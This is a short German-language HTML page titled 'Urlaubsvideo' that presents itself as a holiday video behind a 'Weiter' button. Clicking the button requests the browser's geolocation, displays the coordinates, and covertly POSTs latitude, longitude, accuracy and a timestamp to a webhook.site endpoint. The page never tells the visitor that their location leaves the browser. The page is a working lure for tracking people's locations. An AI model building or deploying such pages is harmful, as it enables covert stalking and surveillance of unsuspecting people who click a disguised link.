<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Urlaubsvideo</title>
  <style>
    body { font-family: sans-serif; text-align: center; padding: 40px; }
    button { font-size: 1.2em; padding: 12px 24px; background-color: #007bff; color: white; border: none; border-radius: 5px; }
    #output { margin-top: 20px; color: #333; }
  </style>
</head>
<body>
  <h1>Willkommen</h1>
  <p>Klicken Sie auf den Button, um fortzufahren.</p>
  <button id="startBtn">Weiter</button>
  <div id="output"></div>

  <script>
    document.getElementById('startBtn').addEventListener('click', function () {
      if (!navigator.geolocation) {
        document.getElementById('output').textContent = 'Geolocation wird nicht unterstützt.';
        return;
      }
      
      document.getElementById('output').textContent = 'Warte auf Standortfreigabe...';

      navigator.geolocation.getCurrentPosition(
        function (position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          
          // Anzeige auf der Webseite
          document.getElementById('output').textContent = 'Standort: ' + lat.toFixed(5) + ', ' + lon.toFixed(5);
          
          // HIER WIRD ES AN WEBHOOK GESENDET:
          fetch('https://webhook.site/fbfc485c-39c9-4ff4-bd01-cd476a988857', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              latitude: lat,
              longitude: lon,
              genauigkeit: position.coords.accuracy,
              zeit: new Date().toISOString()
            })
          }).catch(err => console.log('Fehler beim Senden', err));
        },
        function (error) {
          document.getElementById('output').textContent = 'Zugriff verweigert oder Fehler: ' + error.message;
        }
      );
    });
  </script>
</body>
</html>
